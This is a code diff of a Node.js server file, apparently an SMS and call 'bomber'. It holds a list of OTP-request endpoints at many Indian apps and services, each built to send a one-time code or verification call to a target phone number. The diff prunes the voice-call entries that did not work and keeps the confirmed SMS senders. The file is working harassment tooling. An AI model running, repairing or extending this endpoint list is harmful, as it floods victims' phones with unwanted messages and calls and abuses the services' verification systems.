@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - FINAL (Only Confirmed SMS Senders + Voice APIs)
-// Based on actual SMS delivery from screenshots
+// api_server.js - FINAL (Failed Voice Calls Removed)
+// SMS APIs untouched, only failed voice/call APIs removed
 // ============================================================
 
 const express = require('express');
@@ -18,7 +18,7 @@ const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
 
 // ============================================================
-// ===== ALL CONFIRMED APIS =====
+// ===== ALL APIS =====
 // ============================================================
 
 const APIS = [
@@ -27,7 +27,7 @@ const APIS = [
     // ✅ CONFIRMED SMS SENDERS (Screenshots Verified)
     // ============================================================
 
-    // ===== BLOCK 1: OLD SS CONFIRMED =====
+    // ===== OLD SS CONFIRMED =====
     {
         name: "Gaana",
         method: "POST",
@@ -317,7 +317,7 @@ const APIS = [
         }
     },
 
-    // ===== BLOCK 2: NEW SS CONFIRMED (Abhi wale) =====
+    // ===== NEW SS CONFIRMED =====
     {
         name: "Urban Company",
         method: "POST",
@@ -419,7 +419,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 📞 VOICE / CALL APIs (Saare)
+    // 📞 WORKING VOICE / CALL APIs (Failed ones removed)
     // ============================================================
 
     {
@@ -448,17 +448,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
     },
     {
-        name: "1MG Voice",
-        method: "POST",
-        url: "https://www.1mg.com/auth_api/v6/create_token",
-        headers: {
-            "Accept": "application/vnd.healthkartplus.v11+json",
-            "Content-Type": "application/json; charset=utf-8",
-            "User-Agent": "okhttp/3.9.1"
-        },
-        data: (phone) => JSON.stringify({ number: phone, otp_on_call: true })
-    },
-    {
         name: "Swiggy Call",
         method: "POST",
         url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
@@ -480,34 +469,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ phone: phone })
     },
     {
-        name: "Zomato Voice",
-        method: "POST",
-        url: "https://www.zomato.com/php/o2_api_handler.php",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        data: (phone) => `phone=${phone}&type=voice`
-    },
-    {
-        name: "Paytm Voice",
-        method: "POST",
-        url: "https://accounts.paytm.com/signin/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phone: phone })
-    },
-    {
-        name: "Ixigo Voice",
-        method: "POST",
-        url: "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        data: (phone) => `prefix=%2B91&phone=${phone}&resendOnCall=true`
-    },
-    {
-        name: "Oyo Voice",
-        method: "POST",
-        url: "https://oyorooms.com/v1/user/otplogin",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phoneNumber: phone, otpType: "voice" })
-    },
-    {
         name: "Doubtnut Voice",
         method: "POST",
         url: "https://doubtnut.com/api/v2/otpgenerate",
@@ -515,59 +476,10 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobile: phone })
     },
     {
-        name: "MagicPin Voice",
-        method: "POST",
-        url: "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phoneNumber: "91" + phone, authMethod: "call" })
-    },
-    {
-        name: "Astroyogi Voice",
-        method: "POST",
-        url: "https://comm.astroyogi.com/api/OtpComm/SendOtp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phoneCode: "91", mobileNumber: phone, requestType: "call" })
-    },
-    {
-        name: "Refyne Voice",
-        method: "POST",
-        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ channel: "IVR", recipient: phone })
-    },
-    {
         name: "MyJar Call",
         method: "GET",
         url: "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={phone}",
         headers: { "User-Agent": "Mozilla/5.0" }
-    },
-    {
-        name: "Snitch Voice",
-        method: "POST",
-        url: "https://www.snitch.com/api/auth/resend-otp?mode=voice",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile_number: "+91" + phone })
-    },
-    {
-        name: "Meesho Voice",
-        method: "POST",
-        url: "https://meesho.com/gw/login-register/v1/sendOTP",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ number: phone, otpOnCall: true })
-    },
-    {
-        name: "Jupiter Voice",
-        method: "POST",
-        url: "https://jupiter.money/api/v2/auth/send-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phoneNumber: phone, otpType: "voice" })
-    },
-    {
-        name: "Pokerbaazi Voice",
-        method: "POST",
-        url: "https://pokerbaazi.com/v1/user/otplogin",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ number: phone, otpOnCall: true })
     },
     {
         name: "Zepto Voice",
@@ -577,13 +489,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ number: phone, otpOnCall: true })
     },
     {
-        name: "Ajio Voice",
-        method: "POST",
-        url: "https://ajio.com/v3/auth/otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phoneNumber: phone, otpType: "voice" })
-    },
-    {
         name: "Zivame Voice",
         method: "POST",
         url: "https://zivame.com/api/v2/customer/login/send-otp",
@@ -591,58 +496,9 @@ const APIS = [
         data: (phone) => JSON.stringify({ phone_number: phone, otp_type: "voice" })
     },
     {
-        name: "Flipkart Voice",
-        method: "POST",
-        url: "https://www.flipkart.com/api/6/user/voice-otp/generate",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile: phone })
-    },
-    {
-        name: "Amazon Voice",
-        method: "POST",
-        url: "https://www.amazon.in/ap/signin",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        data: (phone) => `phone=${phone}&action=voice_otp`
-    },
-    {
         name: "Goibibo Voice",
         method: "POST",
         url: "https://www.goibibo.com/user/voice-otp/generate/",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phone: phone })
-    },
-    {
-        name: "Ola Voice",
-        method: "POST",
-        url: "https://api.olacabs.com/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phone: phone })
-    },
-    {
-        name: "Uber Voice",
-        method: "POST",
-        url: "https://auth.uber.com/v2/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phone: "+91" + phone })
-    },
-    {
-        name: "IRCTC Call",
-        method: "POST",
-        url: "https://www.irctc.co.in/api/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile: phone })
-    },
-    {
-        name: "PhonePe Call",
-        method: "POST",
-        url: "https://www.phonepe.com/api/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile: phone })
-    },
-    {
-        name: "Google Voice",
-        method: "POST",
-        url: "https://accounts.google.com/v1/voice-otp",
         headers: { "Content-Type": "application/json" },
         data: (phone) => JSON.stringify({ phone: phone })
     },
@@ -663,16 +519,6 @@ const APIS = [
         headers: {}
     },
     {
-        name: "Career360_Call",
-        method: "POST",
-        url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
-        headers: {
-            "X-Requested-With": "XMLHttpRequest",
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" }
-    },
-    {
         name: "Voot Voice",
         method: "POST",
         url: "https://www.voot.com/api/v1/voice-otp",
@@ -683,48 +529,6 @@ const APIS = [
         name: "Kotak Voice",
         method: "POST",
         url: "https://www.kotak.com/api/otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phone: phone })
-    },
-    {
-        name: "BigBasket Voice",
-        method: "POST",
-        url: "https://www.bigbasket.com/api/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phone: phone })
-    },
-    {
-        name: "BookMyShow Voice",
-        method: "POST",
-        url: "https://in.bookmyshow.com/api/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile: phone })
-    },
-    {
-        name: "Cleartrip Voice",
-        method: "POST",
-        url: "https://www.cleartrip.com/api/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile: phone })
-    },
-    {
-        name: "Yatra Voice",
-        method: "POST",
-        url: "https://www.yatra.com/api/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ phone: phone })
-    },
-    {
-        name: "SonyLIV Voice",
-        method: "POST",
-        url: "https://www.sonyliv.com/api/v1/voice-otp",
-        headers: { "Content-Type": "application/json" },
-        data: (phone) => JSON.stringify({ mobile: phone })
-    },
-    {
-        name: "Hotstar Voice",
-        method: "POST",
-        url: "https://www.hotstar.com/api/v1/voice-otp",
         headers: { "Content-Type": "application/json" },
         data: (phone) => JSON.stringify({ phone: phone })
     },
